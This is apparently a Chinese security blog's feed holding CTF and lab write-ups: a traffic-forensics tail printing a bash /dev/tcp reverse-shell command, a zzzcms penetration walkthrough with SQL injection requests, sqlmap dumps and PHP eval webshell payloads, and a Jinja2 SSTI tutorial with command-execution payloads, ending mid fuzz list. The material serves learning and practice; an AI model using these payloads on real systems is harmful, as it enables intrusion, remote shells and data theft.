time <span class="number">1000</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">0.746</span>/<span class="number">0.911</span>/<span class="number">1.076</span>/<span class="number">0.165</span> ms</span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;bash -i &gt;&amp;/dev/tcp/192.168.12.140/1234 0&gt;&amp;1 2&gt;&amp;1&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里可能有点乱，不过不影响了应该，可以看到所有的内容了</p><p>这里看到有一个反弹了shell，bash -i &gt;&amp;/dev/tcp/192.168.12.140/1234 0&gt;&amp;1 2&gt;&amp;1</p><p>账号密码的话，可以john爆破，很简单，在kali上新建一个文件，然后 直接john a.txt即可</p><p><img src="/images/tiesan/image-20230505204836260.png" alt="image-20230505204836260"></p><p><img src="/images/tiesan/image-20230505205041689.png" alt="image-20230505205041689"></p><p>跑了很久，simple的密码没有跑出来，root密码为123456。</p><p>到这里所有的信息就都知道了。</p><p>如果打包题目的师傅，可以留言。我忘记打包整站目录了。</p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> 信息安全铁人三项赛 </tag>
            
            <tag> 长城杯 </tag>
            
            <tag> weevely分析 </tag>
            
            <tag> 溯源取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lab8-wp</title>
      <link href="/2023/04/14/lab8-wp/"/>
      <url>/2023/04/14/lab8-wp/</url>
      
        <content type="html"><![CDATA[<p><img src="D:\myBlog\images\lab8-wp\image-20250414181411520.png" alt="image-20250414181411520"></p><p><img src="D:\myBlog\images\lab8-wp\image-20250414183248548.png" alt="image-20250414183248548"></p><p>第一天开环境的时候，不知道为什么，开完环境，啥也没有，果断一下分配的ip的端口，扫到两个，直接三板斧无果。</p><p>第二天又去开环境，开完有个cms，我勒个豆，感情昨天扫了俩小时，打歪了。</p><p>开局一个zzzcms</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415163502978.png" alt="image-20250415163502978"></p><p>开始搜索zzzcms历史漏洞，看了几个文章，发现很乱，不知道哪个可以。先找简单的试一下。</p><p>首先肯定是弱口令，试了几个无果，找个文章</p><p><a href="https://www.cnblogs.com/0daybug/p/12565986.html%EF%BC%8C">https://www.cnblogs.com/0daybug/p/12565986.html，</a></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415163743170.png" alt="image-20250415163743170"></p><p>泄露config.php，<code>/admin/?module=templateedit&amp;type=/config/zzz_config.php</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415163853515.png" alt="image-20250415163853515"></p><p>有数据库账号密码，</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415163912333.png" alt="image-20250415163912333"></p><p>拿去连下，发现不行，做了限制，不允许的ip。这里也试了一下，不是admin的密码。那就只能换思路了。</p><p>又看到一篇大佬文章，<a href="https://www.laitimes.com/article/2t711_38slf.html%EF%BC%8C%E8%AF%B4%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%9E%9C%E6%96%AD%E8%AF%95%E4%B8%80%E4%B8%8B%E3%80%82">https://www.laitimes.com/article/2t711_38slf.html，说存在注入，果断试一下。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /search/ HTTP/1.1</span><br><span class="line">Host: 172.50.12.33</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=5ij67devm1pd3ssb93g4um3fs4; zzz_adminpass=1;zzz_keys=0*</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>bp试一下</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164243491.png" alt="image-20250415164243491"></p><p>时间是设置的二倍</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164142426.png" alt="image-20250415164142426"></p><p>sqlmap直接跑，<code>python3 .\sqlmap.py -r C:\Users\xin\Desktop\gggggg.txt --risk 3 --level 3 -D zzzcms -T zzz_u ser --dump</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164658134.png" alt="image-20250415164658134"></p><p>admin,84c45962d887564f</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164730911.png" alt="image-20250415164730911"></p><p>这种直接去百度搜就行，</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164749973.png" alt="image-20250415164749973"></p><p>admin,admin123456</p><p>到这，我们可以登录了，相信大家已经看了一些文章说，admin的目录是admin+三位字符，这里靶机环境不是，就是admin。<code>http://172.50.12.33/plugins/webuploader/js/webconfig.php</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415164950751.png" alt="image-20250415164950751"></p><p>这里可以看到，还得我还跑了一圈，没跑到。</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415165042550.png" alt="image-20250415165042550"></p><p>接下来就是后台了</p><p>根据这篇文章，<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Zzzcms/Zzzcms%201.61%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Zzzcms/Zzzcms%201.61%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p><p>进行后台rce，</p><p><img src="D:\myBlog\images\lab8-wp\image-20250415170042733.png" alt="image-20250415170042733"></p><p>登录进来，点上面模板管理，本地模板，找到电脑的，找到search.html，后面加一句。</p><p><code>&#123;if:assert($_request[phpinfo()])&#125;phpinfo();eva1($_POST[&#39;a&#39;]);&#123;end if&#125;</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415170158388.png" alt="image-20250415170158388"></p><p><a href="http://172.50.12.33/search/%EF%BC%8C%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AFhttp://172.50.12.33/search/index.php">http://172.50.12.33/search/，其实就是http://172.50.12.33/search/index.php</a></p><p><img src="D:\myBlog\images\lab8-wp\image-20250415170226485.png" alt="image-20250415170226485"></p><p><code>&#123;if:assert($_POST[x])&#125;phpinfo();&#123;end if&#125;</code></p><p><img src="D:\myBlog\images\lab8-wp\image-20250416092837347.png" alt="image-20250416092837347"></p><p>这样的话就连上来了。</p><p><img src="D:\myBlog\images\lab8-wp\image-20250416092820755.png" alt="image-20250416092820755"></p><p>gears</p><p>python3 .\sqlmap.py -u “<a href="http://172.10.59.35/moduleinterface.php?mact=News,m_,default,0&amp;m_idlist=a,b,c,1,2,3))*&quot;">http://172.10.59.35/moduleinterface.php?mact=News,m_,default,0&amp;m_idlist=a,b,c,1,2,3))*&quot;</a> –batch –level 5 –risk 3</p><p>pt-1</p><p><a href="http://10.0.0.68/cslab/admin_notify.php">http://10.0.0.68/cslab/admin_notify.php</a></p><p>cslab cslab </p><p>notify1=1”;eval($_POST[a]);phpinfo();highlight_file(<strong>FILE</strong>);//&amp;notify2=2&amp;notify3=3</p><p><code>a=system(&#39;echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt; ./shell.txt&#39;);</code></p><p>a=copy(‘shell.txt’,’a.php’);</p><p>windows/x64/meterpreter/bind_tcp</p><p><img src="D:\myBlog\images\lab8-wp\image-20250428175114712.png" alt="image-20250428175114712"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /message/index.html HTTP/1.1</span><br><span class="line">Host: 192.168.111.200</span><br><span class="line">Content-Length: 45</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://192.168.111.200</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.111.200/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=r1ttlpnb1h9aib0fnd8raq3fgj</span><br><span class="line">cdn-src-ip: 2&#x27; and extractvalue(0x0a,concat(0x0a,(select user()))) and &#x27;1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">tid=1&amp;user=1&amp;title=1&amp;tel=13011111111&amp;body=123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cdn-src-ip: 2&#x27; and extractvalue(0x0a,concat(0x0a,(select group_concat(schema_name)   from information_schema.schemata))) and &#x27;1</span><br><span class="line">information_schema,jizhicms,jiz</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-ssti学习</title>
      <link href="/2023/04/07/ctfshow-ssti%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/04/07/ctfshow-ssti%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="SSTI是什么"><a href="#SSTI是什么" class="headerlink" title="SSTI是什么"></a>SSTI是什么</h3><p>SSTI，服务端模板注入，其实也就是模板引擎+注入，那么我们首先需要了解一下模板引擎</p><blockquote><p>模板引擎是为了使用户界面与业务数据分离而产生，它可以生成特定格式的文档，利用模板引擎来生成前端的 HTML 代码，模板引擎会提供一套生成 HTML 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板 + 用户数据的前端 HTML 页面，然后反馈给浏览器，呈现在用户面前。</p></blockquote><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。<br>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p><p>常见的模板引擎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP: Smarty, Twig, Blade</span><br><span class="line">JAVA: JSP, FreeMarker, Velocity</span><br><span class="line">Python: Jinja2, django, tornado</span><br></pre></td></tr></table></figure><p>由于渲染的数据是业务数据,且大多数都由用户提供,这就意味着用户对输入可控.如果后端没有对用户的输入进行检测和判断,那么就容易产生代码和数据混淆,从而产生注入.</p><p>在 SSTI 漏洞点中， 里面的内容会被执行。</p><p>此篇文章仅探究python中ssti</p><p>题目地址    <a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p><blockquote><p>个人理解ssti题目就是获取一些危险子类，在危险子类中寻找可以利用的函数来命令执行或文件读取等</p></blockquote><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>在学习SSTI注入之前，我们首先需要了解一些python的魔术方法和内置类</p><p><code>__class__</code>用于返回该对象所属的类<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;abcd&#x27;.__class__</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;class &#x27;tuple&#x27;&gt;</span><br></pre></td></tr></table></figure><p><code>__base__</code>用于获取类的基类（也称父类）<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__base__</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">//object为str的基类</span><br></pre></td></tr></table></figure><p><code>__mro__</code>返回解析方法调用的顺序。（当调用_mro_[1]或者-1时作用其实等同于_base_）<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[1]</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[-1]</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure><p><code>__subclasses__()</code>可以获取类的所有子类<br>示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[-1].__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;,&lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;...]</span><br></pre></td></tr></table></figure><h4 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h4><p>题目传参为name 也就是/?name=1</p><p><a href="http://7650d43c-2ae1-4428-aa41-80f2cd571827.challenge.ctf.show/?name=1">http://7650d43c-2ae1-4428-aa41-80f2cd571827.challenge.ctf.show/?name=1</a></p><p>回显为1，测试是否存在ssti漏洞，</p><p><code>payload：http://7650d43c-2ae1-4428-aa41-80f2cd571827.challenge.ctf.show/?name=&#123;&#123;7*7&#125;&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">正常没有漏洞将回显传入的值，然而`Flask`中使用了`Jinja2` 作为模板渲染引擎，&#123;&#123;&#125;&#125;在`Jinja2`中作为变量包裹标识符，`Jinja2`在渲染的时候会把&#123;&#123;&#125;&#125;包裹的内容进行解析。`&#123;&#123;7*7&#125;&#125;`会被解析成49。</span><br><span class="line"></span><br><span class="line">第一步使用 class获取当前类使用`__class__`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br><span class="line">返回</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;1.__class__\&#125;\&#125;</span><br><span class="line">返回</span><br><span class="line">&lt;class &#x27;int&#x27;&gt;</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;a.__class__&#125;&#125;</span><br><span class="line">返回</span><br><span class="line">&lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">返回</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二步使用 获取当前类的基类，这里可以用`__base__`，也可以用`__mro__`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br><span class="line">返回</span><br><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">取object</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br><span class="line">或</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">或</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[-1]&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第三步获取基类的子类，这里可以用`__subclasses__()`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br><span class="line">返回</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;,........</span><br></pre></td></tr></table></figure><p>第四步，获取可以使用类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">脚本<span class="number">1</span>  本地查找</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将查找到的父类列表替换到data中</span></span><br><span class="line">data = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    [&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ......]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 在这里添加可以利用的类，下面会介绍这些类的利用方法</span></span><br><span class="line">userful_class = [<span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;os._wrap_close&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, <span class="string">&#x27;warnings.catch_warnings&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>, <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>, <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span>)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> class_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> userful_class:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(class_list.index(c)) + <span class="string">&quot;: &quot;</span> + c)</span><br><span class="line">            </span><br><span class="line">//          </span><br><span class="line">脚本<span class="number">2</span> 在线查找</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:5000/?name=\</span></span><br><span class="line"><span class="string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230408161509018.png" alt="image-20230408161509018"></p><p>可以看到os可以使用，在132位</p><p><code>&#123;&#123;"".__class__.__mro__[-1].__subclasses__()[132]&#125;&#125;</code></p><p>第五步，继续构造，接下来就可以利用<code>os。_wrap_close</code>，这个类中有<code>popen</code>方法，我们去调用它</p><p>先调用它的__init__方法进行初始化类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__&#125;&#125;</span><br><span class="line">返回</span><br><span class="line">//&lt;function _wrap_close.__init__ at 0x7f37bfb745e0&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409220834519.png" alt="image-20230409220834519"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;id&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230409220943551.png" alt="image-20230409220943551"></p><p>即可命令执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5dc9087f-a33a-43fd-89f6-729c41675180.challenge.ctf.show/?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="web362-开始过滤"><a href="#web362-开始过滤" class="headerlink" title="web362 开始过滤"></a>web362 开始过滤</h4><p>不清楚过滤了什么，fuzz一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;4*4&#125;&#125;[[5*5]]</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><br><span class="line">&lt;%= 7 * 7 %&gt;</span><br><span class="line">$&#123;3*3&#125;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">@(1+2)</span><br><span class="line">#&#123;3*3&#125;</span><br><span class="line">#&#123; 7 * 7 &#125;</span><br><span class="line">&#123;&#123;dump(app)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.server.all|join(&#x27;,&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].class.base.subclasses() &#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.class.mro()[1].subclasses()&#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;</span><br><span class="line">&#123;% for key, value in config.iteritems() %&#125;&lt;dt&gt;&#123;&#123; key|e &#125;&#125;&lt;/dt&gt;&lt;dd&gt;&#123;&#123; value|e &#125;&#125;&lt;/dd&gt;&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123;&#x27;a&#x27;.toUpperCase()&#125;&#125; </span><br><span class="line">&#123;&#123; request &#125;&#125;</span><br><span class="line">&#123;&#123;self&#125;&#125;</span><br><span class="line">&lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br><span class="line">&lt;#assign ex = 